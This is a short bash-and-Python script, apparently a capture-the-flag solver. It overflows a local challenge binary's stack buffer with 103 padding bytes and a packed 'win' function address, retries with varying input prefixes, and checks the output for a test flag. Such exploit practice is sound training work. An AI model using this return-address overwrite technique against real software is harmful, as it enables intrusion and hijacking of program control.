#!/bin/bash
cd .
echo "academy{LOCALTEST}" > flag.txt
python3 - <<'EOF'
import subprocess, struct
WIN = 0x8049206
payload = b"A" * 103 + struct.pack("<I", WIN) + b"\n"
for layers in (60, 70, 75, 77, 78, 80, 90, 100, 120):
    inp = b""
    for _ in range(layers):
        inp += b"1\n2\n3\n"
    inp += payload
    try:
        p = subprocess.run(["./_z_bizz"], input=inp, capture_output=True, timeout=10)
    except subprocess.TimeoutExpired:
        print(layers, "timeout")
        continue
    out = p.stdout.decode(errors="replace")
    tag = "FLAG" if "academy{LOCALTEST}" in out else ""
    print("layers=%d out_len=%d %s tail=%r" % (layers, len(out), tag, out[-120:]))
EOF
